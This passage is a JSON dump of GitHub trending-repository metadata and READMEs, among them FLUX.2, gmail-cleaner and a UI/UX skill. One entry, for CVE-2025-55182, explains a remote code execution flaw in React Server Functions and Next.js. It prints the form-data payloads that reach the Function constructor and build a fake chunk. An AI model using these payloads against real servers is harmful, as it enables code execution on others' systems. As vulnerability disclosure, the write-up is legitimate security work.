running on local computer\n\nIt provides a one-click launch experience similar to open-source GUI Agent MCP, can be deployed entirely locally, and puts the entire inference pipeline under your complete control. Specific capabilities include:\n\n- **Local Deployment**: Supports 4B-scale models running on consumer-grade hardware, balancing low latency with privacy.\n- **One-click Launch**: Provides unified deployment pipeline that automatically handles environment dependencies and device manag",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:34.597906"
  },
  {
    "basic_info": {
      "name": "CVE-2025-55182",
      "full_name": "msanft/CVE-2025-55182",
      "owner": "msanft",
      "description": "Explanation and full RCE PoC for CVE-2025-55182",
      "url": "https://github.com/msanft/CVE-2025-55182",
      "clone_url": "https://github.com/msanft/CVE-2025-55182.git",
      "ssh_url": "git@github.com:msanft/CVE-2025-55182.git",
      "homepage": "",
      "created_at": "2025-12-04T11:49:55Z",
      "updated_at": "2025-12-14T01:32:03Z",
      "pushed_at": "2025-12-08T13:51:04Z"
    },
    "stats": {
      "stars": 1204,
      "forks": 174,
      "watchers": 1204,
      "open_issues": 0,
      "size": 70
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 1075,
        "TypeScript": 899,
        "JavaScript": 559,
        "CSS": 488
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# CVE-2025-55182\n\nThis vulnerability allows RCE in React Server Functions, e.g. as\noffered by Next.js through insecure prototype references.\n\nI'm not an expert in React or Next.js, so take all the information\nhere with a grain of salt.\n\n## Background\n\nReact offers Server Functions[^1], which can be seen as sort of an RPC-\nover-HTTP. They can be used to fetch data from adjacent peers to ensure\nlow latency, or perform authenticated requests that the client lacks\ncredentials for.\n\nReact uses something called the React Flight Protocol[^2] for serialization\nof values passed to Server Functions.\n\nThe client passes \"chunks\" to the server, e.g. via form data:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1\"]'),\n    \"1\": (None, '{\"object\":\"fruit\",\"name\":\"$2:fruitName\"}'),\n    \"2\": (None, '{\"fruitName\":\"cherry\"}'),\n}\n```\n\nAs shown, these can have references in between each other.\nThe above payload deserializes to the following on the server:\n\n```js\n{ object: 'fruit', name: 'cherry' }\n```\n\nThe format itself is a little more intricate and allows for more\ncomplex serialization and deserialization, but this provides a\nbasic understanding for the actual vulnerability.\n\n## Vulnerability\n\nUntil this commit[^3], when traversing chunks in reference resolving,\nsuch as getting the `fruitName` from chunk 2 in the above example, React\ndidn't verify whether the requested key was actually set on the object.\nThis allowed us to get the object prototype[^4].\n\nThis can be demonstrated with a payload like this:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1:__proto__:constructor:constructor\"]'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nWhich deserializes to the function constructor[^5]:\n\n```js\n[Function: Function]\n```\n\nWhen the chunk with ID 0 is not an array but an object, we can\nset the `then` key to the function constructor. The object is then\nreturned by the `decodeReplyFromBusboy` function and awaited by Next.js:\n\n```ts\n// action-handler.ts:888 (pre-patch)\nboundActionArguments = await decodeReplyFromBusboy(\n    busboy,\n    serverModuleMap,\n    { temporaryReferences }\n)\n```\n\nWhen this returns a thenable, the `await` in the caller will call it.\nThis is what happens with this payload:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\":\"$1:__proto__:constructor:constructor\"}'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nLeading to this error:\n\n```console-out\nSyntaxError: Unexpected token 'function'\n    at Object.Function [as then] (<anonymous>) {\n      digest: '1259793845'\n    }\n```\n\nThe error looks like this since V8 calls an `await`ed function\nwith the internal `resolve` and `reject` functions, which, when\n`toString`ed, serialize to something like this:\n\n```js\nfunction () { [native code] }\n```\n\n## Exploitation\n\nSince we can trivially retrieve the `Function` constructor, the\nstraightforward way is to find a call gadget that invokes the\nconstructor with a user-controlled value (i.e., the code of the\nfunction as a string), and later calls the returned function.\n\nThere are multiple places that can call the function constructor,\nfor example `resolveServerReference`, where `id` is a controlled object,\nand `lastIndexOf` can be overwritten to return a user-controlled string\n(e.g. via `Array.prototype.join`) and `slice` can be overwritten to the\nfunction constructor. However, this place doesn't work as the second\ninvocation of `.slice()` supplies a number as the first argument,\nwhich -to my best knowledge- can never be handled by the function\nconstructor.\n\nHere, a brilliant idea from maple3142[^6] comes in. When `getChunk`\ngrabs the chunk at ID 0 as the root reference to start resolving the\nreference chain, *this very same chunk* can resolve to a crafted\n\"fake chunk\".\n\nWe can reference the crafted chunk 0 in chunk 1 by using the\n`$@` syntax, which returns the \"raw\" chunk, not it's resolved value:\n\n```js\ncase \"@\":\n  return (\n    (obj = parseInt(value.slice(2), 16)), getChunk(response, obj)\n  );\n```\n\nCombining this with our `then` overwrite from above, we can craft\nsomething like this:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nHere, chunk 0 overwrites its own `.then()` with the `.then()` of\nits own raw chunk representation. Put simply, we overwrite our\nown `.then()` with `Chunk.prototype.then`, which exists, since\n`Chunk`s are thenables:\n\n```js\nChunk.prototype.then = function (resolve, reject) {\n      switch (this.status) {\n        case \"resolved_model\":\n          initializeModelChunk(this);\n      }\n      // ...\n```\n\nWith the above payload, `Chunk.prototype.then` is eventually called\nwith the crafted chunk with ID 0.\n\nAs shown above, when `.status` on our fake chunk is `resolved_model`:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nWe get into `initializeModelChunk`. Here, `.value` is parsed as JSON,\nand then references are resolved on the returned object, using the \"outer\"\ncontext of our chunks with IDs 0 and 1:\n\n```js\nfunction initializeModelCh",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:35.696327"
  },
  {
    "basic_info": {
      "name": "flux2",
      "full_name": "black-forest-labs/flux2",
      "owner": "black-forest-labs",
      "description": "Official inference repo for FLUX.2 models",
      "url": "https://github.com/black-forest-labs/flux2",
      "clone_url": "https://github.com/black-forest-labs/flux2.git",
      "ssh_url": "git@github.com:black-forest-labs/flux2.git",
      "homepage": null,
      "created_at": "2025-11-24T23:28:49Z",
      "updated_at": "2025-12-13T13:34:56Z",
      "pushed_at": "2025-12-01T13:32:55Z"
    },
    "stats": {
      "stars": 1191,
      "forks": 60,
      "watchers": 1191,
      "open_issues": 5,
      "size": 37542
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 84177
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# FLUX.2\nby Black Forest Labs: https://bfl.ai.\n\nDocumentation for our API can be found here: [docs.bfl.ai](https://docs.bfl.ai/).\n\nThis repo contains minimal inference code to run image generation & editing with our FLUX.2 open-weight models.\n\n## `FLUX.2 [dev]`\n\n`FLUX.2 [dev]` is a 32B parameter flow matching transformer model capable of generating and editing (multiple) images. The model is released under the [FLUX.2-dev Non-Commercial License](model_licenses/LICENSE-FLUX-DEV) and can be found [here](https://huggingface.co/black-forest-labs/FLUX.2-dev).\n\nNote that the below script for `FLUX.2 [dev]` needs considerable amount of VRAM (H100-equivalent GPU). We partnered with Hugging Face to make quantized versions that run on consumer hardware; below you can find instructions on how to run it on a RTX 4090 with a remote text encoder, for other quantization sizes and combinations, check the [diffusers quantization guide here](docs/flux2_dev_hf.md).\n\n### Text-to-image examples\n\n![t2i-grid](assets/teaser_generation.png)\n\n### Editing examples\n\n![edit-grid](assets/teaser_editing.png)\n\n### Prompt upsampling\n\n`FLUX.2 [dev]` benefits significantly from prompt upsampling. The inference script below offers the option to use both local prompt upsampling with the same model we use for text encoding ([`Mistral-Small-3.2-24B-Instruct-2506`](https://huggingface.co/mistralai/Mistral-Small-3.2-24B-Instruct-2506)), or alternatively, use any model on [OpenRouter](https://openrouter.ai/) via an API call.\n\nSee the [upsampling guide](docs/flux2_with_prompt_upsampling.md) for additional details and guidance on when to use upsampling.\n\n## `FLUX.2` autoencoder\n\nThe FLUX.2 autoencoder has considerably improved over the [FLUX.1 autoencoder](https://huggingface.co/black-forest-labs/FLUX.1-dev/blob/main/ae.safetensors). The autoencoder is released under [Apache 2.0](https://huggingface.co/datasets/choosealicense/licenses/blob/main/markdown/apache-2.0.md) and can be found [here](https://huggingface.co/black-forest-labs/FLUX.2-dev/blob/main/ae.safetensors). For more information, see our [technical blogpost](https://bfl.ai/research/representation-comparison).\n\n## Local installation\n\nThe inference code was tested on GB200 and H100 (with CPU offloading).\n\n### GB200\n\nOn GB200, we tested `FLUX.2 [dev]` using CUDA 12.9 and Python 3.12.\n\n```bash\npython3.12 -m venv .venv\nsource .venv/bin/activate\npip install -e . --extra-index-url https://download.pytorch.org/whl/cu129 --no-cache-dir\n```\n\n### H100\n\nOn H100, we tested `FLUX.2 [dev]` using CUDA 12.6 and Python 3.10.\n\n```bash\npython3.10 -m venv .venv\nsource .venv/bin/activate\npip install -e . --extra-index-url https://download.pytorch.org/whl/cu126 --no-cache-dir\n```\n\n## Run the CLI\n\nBefore running the CLI, you may download the weights from [here](https://huggingface.co/black-forest-labs/FLUX.2-dev) and set the following environment variables.\n\n```bash\nexport FLUX2_MODEL_PATH=\"<flux2_path>\"\nexport AE_MODEL_PATH=\"<ae_path>\"\n```\n\nIf you don't set the environment variables, the weights will be downloaded\nautomatically.\n\nYou can start an interactive session with loaded weights by running the\nfollowing command. That will allow you to do both text to image generation as\nwell as editing one or multiple images.\n```bash\nexport PYTHONPATH=src\npython scripts/cli.py\n```\n\nOn H100, we additionally set the flag `--cpu_offloading True`.\n\n## Watermarking\n\nWe've added an option to embed invisible watermarks directly into the generated images\nvia the [invisible watermark library](https://github.com/ShieldMnt/invisible-watermark).\n\nAdditionally, we are recommending implementing a solution to mark the metadata of your outputs, such as [C2PA](https://c2pa.org/)\n\n## ğŸ§¨ Lower VRAM diffusers example\n\nThe below example should run on a RTX 4090. For more examples check the [diffusers quantization guide here](docs/flux2_dev_hf.md)\n\n```python\nimport torch\nfrom diffusers import Flux2Pipeline\nfrom diffusers.utils import load_image\nfrom huggingface_hub import get_token\nimport requests\nimport io\n\nrepo_id = \"diffusers/FLUX.2-dev-bnb-4bit\"\ndevice = \"cuda:0\"\ntorch_dtype = torch.bfloat16\n\ndef remote_text_encoder(prompts):\n    response = requests.post(\n        \"https://remote-text-encoder-flux-2.huggingface.co/predict\",\n        json={\"prompt\": prompts},\n        headers={\n            \"Authorization\": f\"Bearer {get_token()}\",\n            \"Content-Type\": \"application/json\"\n        }\n    )\n    prompt_embeds = torch.load(io.BytesIO(response.content))\n\n    return prompt_embeds.to(device)\n\npipe = Flux2Pipeline.from_pretrained(\n    repo_id, text_encoder=None, torch_dtype=torch_dtype\n).to(device)\n\nprompt = \"Realistic macro photograph of a hermit crab using a soda can as its shell, partially emerging from the can, captured with sharp detail and natural colors, on a sunlit beach with soft shadows and a shallow depth of field, with blurred ocean waves in the background. The can has the text `BFL Diffusers` on it and it has a color gradient that star",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:36.811758"
  },
  {
    "basic_info": {
      "name": "ui-ux-pro-max-skill",
      "full_name": "nextlevelbuilder/ui-ux-pro-max-skill",
      "owner": "nextlevelbuilder",
      "description": "An AI SKILL that provide design intelligence for building professional UI/UX multiple platforms",
      "url": "https://github.com/nextlevelbuilder/ui-ux-pro-max-skill",
      "clone_url": "https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.git",
      "ssh_url": "git@github.com:nextlevelbuilder/ui-ux-pro-max-skill.git",
      "homepage": "https://ui-ux-pro-max-skill.nextlevelbuilder.io",
      "created_at": "2025-11-30T11:36:31Z",
      "updated_at": "2025-12-14T02:35:55Z",
      "pushed_at": "2025-12-06T07:03:28Z"
    },
    "stats": {
      "stars": 1189,
      "forks": 308,
      "watchers": 1189,
      "open_issues": 2,
      "size": 1264
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 45652,
        "TypeScript": 11766,
        "JavaScript": 1629
      },
      "license": "MIT License",
      "topics": [
        "ai-skills",
        "antigravity",
        "claude",
        "claude-code",
        "command-line",
        "command-line-tool",
        "copilot",
        "cursor-ai",
        "dashboard-templates",
        "html5",
        "kiro",
        "kiro-dev",
        "landing-page",
        "mobile-ui",
        "react",
        "tailwindcss",
        "ui-design",
        "uikit",
        "windsurf-ai"
      ]
    },
    "content": {
      "readme": "# UI UX Pro Max\n\nAn AI skill that provides design intelligence for building professional UI/UX across multiple platforms and frameworks.\n\n<p align=\"center\">\n  <img src=\"screenshots/website.png\" alt=\"UI UX Pro Max\" width=\"800\">\n</p>\n\n## Overview\n\nUI UX Pro Max is a searchable database of UI styles, color palettes, font pairings, chart types, product recommendations, UX guidelines, and stack-specific best practices. It works as a skill/workflow for AI coding assistants (Claude Code, Cursor, Windsurf, etc.).\n\n## Features\n\n- **57 UI Styles** - Glassmorphism, Claymorphism, Minimalism, Brutalism, Neumorphism, Bento Grid, Dark Mode, and more\n- **95 Color Palettes** - Industry-specific palettes for SaaS, E-commerce, Healthcare, Fintech, Beauty, etc.\n- **56 Font Pairings** - Curated typography combinations with Google Fonts imports\n- **24 Chart Types** - Recommendations for dashboards and analytics\n- **8 Tech Stacks** - React, Next.js, Vue, Svelte, SwiftUI, React Native, Flutter, HTML+Tailwind\n- **98 UX Guidelines** - Best practices, anti-patterns, and accessibility rules\n\n## Installation\n\n### Using CLI (Recommended)\n\n```bash\n# Install CLI globally\nnpm install -g uipro-cli\n\n# Go to your project\ncd /path/to/your/project\n\n# Install for your AI assistant\nuipro init --ai claude      # Claude Code\nuipro init --ai cursor      # Cursor\nuipro init --ai windsurf    # Windsurf\nuipro init --ai antigravity # Antigravity (.agent + .shared)\nuipro init --ai copilot     # GitHub Copilot\nuipro init --ai kiro        # Kiro\nuipro init --ai all         # All assistants\n```\n\n### Other CLI Commands\n\n```bash\nuipro versions              # List available versions\nuipro update                # Update to latest version\nuipro init --version v1.0.0 # Install specific version\n```\n\n### Manual Installation\n\nCopy the appropriate folders to your project:\n\n| AI Assistant   | Folders to Copy                                                     |\n| -------------- | ------------------------------------------------------------------- |\n| Claude Code    | `.claude/skills/ui-ux-pro-max/`                                     |\n| Cursor         | `.cursor/commands/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`      |\n| Windsurf       | `.windsurf/workflows/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`   |\n| Antigravity    | `.agent/workflows/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`      |\n| GitHub Copilot | `.github/prompts/ui-ux-pro-max.prompt.md` + `.shared/ui-ux-pro-max/`|\n| Kiro           | `.kiro/steering/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`        |\n\n## Prerequisites\n\nPython 3.x is required for the search script.\n\n```bash\n# Check if Python is installed\npython3 --version\n\n# macOS\nbrew install python3\n\n# Ubuntu/Debian\nsudo apt update && sudo apt install python3\n\n# Windows\nwinget install Python.Python.3.12\n```\n\n## Usage\n\n### Claude Code\n\nThe skill activates automatically when you request UI/UX work. Just chat naturally:\n\n```\nBuild a landing page for my SaaS product\n```\n\n### Cursor / Windsurf / Antigravity\n\nUse the slash command to invoke the skill:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### Kiro\n\nType `/` in chat to see available commands, then select `ui-ux-pro-max`:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### GitHub Copilot\n\nIn VS Code with Copilot, type `/` in chat to see available prompts, then select `ui-ux-pro-max`:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### Example Prompts\n\n```\nBuild a landing page for my SaaS product\n\nCreate a dashboard for healthcare analytics\n\nDesign a portfolio website with dark mode\n\nMake a mobile app UI for e-commerce\n```\n\n### How It Works\n\n1. **You ask** - Request any UI/UX task (build, design, create, implement, review, fix, improve)\n2. **Skill activates** - The AI automatically searches the design database for relevant styles, colors, typography, and guidelines\n3. **Smart recommendations** - Based on your product type and requirements, it finds the best matching design system\n4. **Code generation** - Implements the UI with proper colors, fonts, spacing, and best practices\n\n### Supported Stacks\n\nThe skill provides stack-specific guidelines for:\n\n- **HTML + Tailwind** (default)\n- **React** / **Next.js**\n- **Vue** / **Svelte**\n- **SwiftUI** / **React Native** / **Flutter**\n\nJust mention your preferred stack in the prompt, or let it default to HTML + Tailwind.\n\n## Star History\n\n[![Star History Chart](https://api.star-history.com/svg?repos=nextlevelbuilder/ui-ux-pro-max-skill&type=Date)](https://star-history.com/#nextlevelbuilder/ui-ux-pro-max-skill&Date)\n\n## License\n\nThis project is licensed under the [MIT License](LICENSE).\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:37.938946"
  },
  {
    "basic_info": {
      "name": "gmail-cleaner",
      "full_name": "Gururagavendra/gmail-cleaner",
      "owner": "Gururagavendra",
      "description": "web based GUI to cleanup gmail delete, mark as read, unsubsribe from uncessary things u dont like",
      "url": "https://github.com/Gururagavendra/gmail-cleaner",
      "clone_url": "https://github.com/Gururagavendra/gmail-cleaner.git",
      "ssh_url": "git@github.com:Gururagavendra/gmail-cleaner.git",
      "homepage": "https://gururagavendra.github.io/gmail-cleaner/",
      "created_at": "2025-11-29T09:19:54Z",
      "updated_at": "2025-12-13T22:28:30Z",
      "pushed_at": "2025-12-03T09:21:08Z"
    },
    "stats": {
      "stars": 1139,
      "forks": 57,
      "watchers": 1139,
      "open_issues": 8,
      "size": 19998
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 114276,
        "JavaScript": 78878,
        "HTML": 64248,
        "CSS": 36254,
        "Dockerfile": 720,
        "Procfile": 20
      },
      "license": "MIT License",
      "topics": [
        "open-source",
        "self-hosted"
      ]
    },
    "content": {
      "readme": "# Gmail Bulk Unsubscribe & Cleanup Tool\n\nA **free**, privacy-focused tool to bulk unsubscribe from emails, delete emails by sender, and mark emails as read. No subscriptions, no data collection - runs 100% on your machine.\n\n[![GitHub Sponsors](https://img.shields.io/badge/Sponsor-%E2%9D%A4-pink?style=flat-square&logo=github-sponsors)](https://github.com/sponsors/Gururagavendra)\n[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?style=flat-square&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/gururagavendra)\n\n![Python](https://img.shields.io/badge/Python-3.9+-blue?style=flat-square&logo=python)\n![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat-square&logo=docker)\n![Gmail API](https://img.shields.io/badge/Gmail-API-EA4335?style=flat-square&logo=gmail)\n![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)\n![GitHub stars](https://img.shields.io/github/stars/Gururagavendra/gmail-cleaner?style=flat-square&logo=github)\n\n> **No Subscription Required - Free Forever**\n\n## Features\n\n| Feature | Description |\n|---------|-------------|\n| **Bulk Unsubscribe** | Find newsletters and unsubscribe with one click |\n| **Delete by Sender** | See who sends you the most emails, delete in bulk |\n| **Mark as Read** | Bulk mark thousands of unread emails as read |\n| **Smart Filters** | Filter by days, size of email, and category (Promotions, Social, Updates) |\n| **Privacy First** | Runs locally - your data never leaves your machine |\n| **Super Fast** | Gmail API with batch requests (100 emails per API call) |\n| **Gmail-style UI** | Clean, familiar interface |\n\n## Platform Support\n\nWorks on **all major platforms** - both Docker and local installation:\n\n| Platform | Docker | Local (Python) |\n|----------|--------|----------------|\n| Linux (x86_64) | Native | Native |\n| Windows (x86_64) | Native | Native |\n| macOS Intel | Native | Native |\n| macOS Apple Silicon (M1/M2/M3/M4) | Native | Native |\n\n## Demo\n\n![Gmail Cleaner Demo](demo.gif)\n\n**[Watch Setup Video on YouTube](https://youtu.be/CmOWn8Tm5ZE)** - Step-by-step video on how to setup the repo and run the project locally.\n\n## Feature Requests\n\nLets make this tool a better one by improving as much as possible, All features are welcome, To request a feature, [open a GitHub issue](https://github.com/Gururagavendra/gmail-cleaner/issues/new).\n\n## Prerequisites\n\n- **Docker**: [Docker Desktop](https://www.docker.com/products/docker-desktop/)\n- **Local (Python)**: [Python 3.9+](https://www.python.org/downloads/) and [uv](https://docs.astral.sh/uv/getting-started/installation/)\n\n## Setup\n\n**Important**: You must create your **OWN** Google Cloud credentials. This app doesn't include pre-configured OAuth - that's what makes it privacy-focused! Each user runs their own instance with their own credentials.\n\n### 1. Get Google OAuth Credentials\n\n**Video Tutorial**: [Watch on YouTube](https://youtu.be/CmOWn8Tm5ZE) for a visual walkthrough\n\n1. Go to [Google Cloud Console](https://console.cloud.google.com/)\n2. Create a new project (or select existing)\n3. Search for **\"Gmail API\"** and **Enable** it\n4. Go to **Google Auth Platform**  â†’ Click **\"Get started\"**\n5. Fill in the wizard:\n   - **App Information**: Enter app name (e.g., \"Gmail Cleanup\"), select your email\n   - **Audience**: Select **External**\n   - **Contact Information**: Add your email address\n   - Click **Create**\n6. Go to **Audience** (left sidebar) â†’ Scroll to **Test users**\n   - Click **Add Users** â†’ Add your Gmail address â†’ **Save**\n7. Go to **Clients** (left sidebar) â†’ **Create Client**\n   - Choose the application type based on your setup:\n   \n   | Setup | Application Type | Redirect URI |\n   |-------|------------------|--------------|\n   | **Local/Desktop** (Python with browser) | Desktop app | Not needed |\n   | **Docker/Remote Server** | Web application | `http://YOUR_HOST:8767/` |\n   \n   - Name: \"Gmail Cleanup\" (or anything)\n   - Click **Create**\n   - Click **Download** (downloads JSON file)\n   - Rename the downloaded file to `credentials.json`\n\n> **ğŸ’¡ Which should I choose?**\n> - Running locally with Python (`uv run python main.py`)? â†’ **Desktop app**\n> - Running with Docker or on a remote server? â†’ **Web application**\n\n### 2. Clone the Repository\n\n1. Clone the repo:\n```bash\ngit clone https://github.com/Gururagavendra/gmail-cleaner.git\n```\n\n2. Navigate to the folder:\n```bash\ncd gmail-cleaner\n```\n\n3. Put your `credentials.json` file in the project folder.\n\n## Usage\n\n### Option A: Docker (Recommended)\n\n1. Start the container:\n```bash\ndocker compose up -d\n```\n\n2. Open the app in your browser:\n```\nhttp://localhost:8766\n```\n\n3. Click **\"Sign In\"** button in the web UI\n\n4. Check logs for the OAuth URL (only after clicking Sign In!):\n```bash\ndocker logs $(docker ps -q --filter ancestor=ghcr.io/gururagavendra/gmail-cleaner)\n```\nOr if you built locally:\n```bash\ndocker logs $(docker ps -q --filter name=gmail-cleaner)\n```\n\n5. Copy the Google OAuth URL from lo",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:39.053266"
  },
  {
    "basic_info": {
      "name": "karpathy",
      "full_name": "K-Dense-AI/karpathy",
      "owner": "K-Dense-AI",
      "description": "An agentic Machine Learning Engineer",
      "url": "https://github.com/K-Dense-AI/karpathy",
      "clone_url": "https://github.com/K-Dense-AI/karpathy.git",
      "ssh_url": "git@github.com:K-Dense-AI/karpathy.git",
      "homepage": "https://k-dense.ai",
      "created_at": "2025-11-16T22:39:26Z",
      "updated_at": "2025-12-13T13:15:07Z",
      "pushed_at": "2025-12-07T21:45:35Z"
    },
    "stats": {
      "stars": 1132,
      "forks": 129,
      "watchers": 1132,
      "open_issues": 1,
      "size": 22
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 10658
      },
      "license": "MIT License",
      "topics": [
        "agentic-ai",
        "automl",
        "machine-learning"
      ]
    },
    "content": {
      "readme": "# Karpathy\n\n> **Note:** For more advanced capabilities and end-to-end machine learning, visit [www.k-dense.ai](https://www.k-dense.ai).\n\n[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)\n[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/K-Dense-AI/karpathy/pulls)\n\nAn agentic Machine Learning Engineer that trains state-of-the-art ML models using Claude Code SDK and Google ADK. This is a very simple implemenation demonstraing the power of Claude Scientific Skills for machine learning.\n\n## Prerequisites\n\n- Python 3.13 or higher\n- [uv](https://github.com/astral-sh/uv) package manager\n- Claude Code installed and authenticated (see [installation guide](https://www.claude.com/product/claude-code))\n\n## Setup\n\n### 1. Clone the Repository\n\n```bash\ngit clone https://github.com/K-Dense-AI/karpathy.git\ncd karpathy\n```\n\n### 2. Install Dependencies\n\nInstall dependencies using `uv`:\n\n```bash\nuv sync\n```\n\n### 3. Environment Variables\n\nCreate a `.env` file in the `karpathy` directory with your API keys:\n\n```bash\nOPENROUTER_API_KEY=your_openrouter_api_key_here\nAGENT_MODEL=your_model_name_here\n```\n\nThe `OPENROUTER_API_KEY` is required for the agent to function properly.\n\nThis is the same environment variable that will be copied to the `sandbox` directory so the agents can use any API keys you provide here.\n\n## Quick Start\n\nRun the startup script to set up the sandbox and start the ADK web interface:\n\n```bash\npython start.py\n```\n\nThis automatically:\n1. Creates a `sandbox` directory with scientific skills from Claude Scientific Skills\n2. Sets up a Python virtual environment with ML packages (PyTorch, transformers, scikit-learn, etc.)\n3. Copies your `.env` file to the sandbox\n4. Starts the ADK web interface\n5. Navigate to **http://localhost:8000** in your browser\n6. Select `karpathy` in the top left under 'Select an agent'\n7. All outputs will be in the `sandbox` directory so continue to monitor that as you converse with the agent\n\n**Note:** Any files you want the agent to use (datasets, scripts, etc.) should be manually added to the `sandbox` directory.\n\n## Community\n\nJoin our K-Dense Slack community to connect with other users, share ideas, and get support:\n\n**[Join K-Dense Slack Community](https://join.slack.com/t/k-densecommunity/shared_invite/zt-3iajtyls1-EwmkwIZk0g_o74311Tkf5g)**\n\n## Claude Scientific Skills\n\nThis repository is designed to work with the **[Claude Scientific Skills](https://github.com/K-Dense-AI/claude-scientific-skills)** collection of ready-to-use scientific tools and workflows ([link](https://github.com/K-Dense-AI/claude-scientific-skills)). The `start.py` setup script creates a `sandbox` that includes scientific skills from this collection so the `karpathy` agent can leverage specialized ML libraries and scientific workflows. For full details on the skills themselves, see the upstream repositoryâ€™s README and documentation [here](https://github.com/K-Dense-AI/claude-scientific-skills).\n\n## Manual Usage\n\nTo set up the sandbox without starting the web interface:\n\n```bash\npython -m karpathy.utils\n```\n\n**Note:** Any files you want the agent to use (datasets, scripts, etc.) should be manually added to the `sandbox` directory.\n\nTo run the ADK web interface manually:\n\n```bash\nadk web\n```\n\nThen navigate to **http://localhost:8000** in your browser.\n\n## Enhanced ML Capabilities\n\nIf you want substantially more powerful ML capabilities through a multi-agentic system, sign up for [www.k-dense.ai](https://www.k-dense.ai). Currently in closed beta, launching publicly in December 2025.\n\n## Upcoming Features\n\n- **Modal sandbox integration** - Choose any type of compute you want\n- **K-Dense Web features** - We might make some features from K-Dense Web available here based on interest\n\n## Star History\n\n[![Star History Chart](https://api.star-history.com/svg?repos=K-Dense-AI/karpathy&type=date&legend=top-left)](https://www.star-history.com/#K-Dense-AI/karpathy&type=date&legend=top-left)\n\n## Disclaimer\n\nThis project is **not** endorsed by or affiliated with Andrej Karpathy. The name is used as a tribute and out of deep respect for his contributions to AI and technical leadership.",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:40.157986"
  },
  {
    "basic_info": {
      "name": "Video-Materials-AutoGEN-Workstation",
      "full_name": "Norsico/Video-Materials-AutoGEN-Workstation",
      "owner": "Norsico",
      "description": "ä¸€ä¸ªé›†å†…å®¹ç­–åˆ’ã€AIæ–‡æ¡ˆè‡ªåŠ¨ç”Ÿæˆã€TTS æ‰¹é‡è‡ªåŠ¨é…éŸ³ã€(AI)å›¾ç‰‡ç´ æåˆæˆã€ASRè‡ªåŠ¨æå–è¯­è¨€å­—å¹•è„šæœ¬ã€AIè‡ªç”±åˆ›ä½œäºä¸€ä½“çš„(çŸ­è§†é¢‘)ç”Ÿæˆå·¥ä½œç«™ã€‚æ–¹ä¾¿ç®¡ç†æ¯æœŸçš„è§†é¢‘é¡¹ç›®ã€‚",
      "url": "https://github.com/Norsico/Video-Materials-AutoGEN-Workstation",
      "clone_url": "https://github.com/Norsico/Video-Materials-AutoGEN-Workstation.git",
      "ssh_url": "git@github.com:Norsico/Video-Materials-AutoGEN-Workstation.git",
      "homepage": "",
      "created_at": "2025-11-18T13:04:59Z",
      "updated_at": "2025-12-13T20:16:53Z",
      "pushed_at": "2025-11-30T05:04:02Z"
    },
    "stats": {
      "stars": 1094,
      "forks": 216,
      "watchers": 1094,
      "open_issues": 1,
      "size": 60047
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 19833252,
        "JavaScript": 146698,
        "HTML": 45831,
        "CSS": 28271,
        "Dockerfile": 255,
        "Batchfile": 215
      },
      "license": null,
      "topics": []
    },
    "content": {
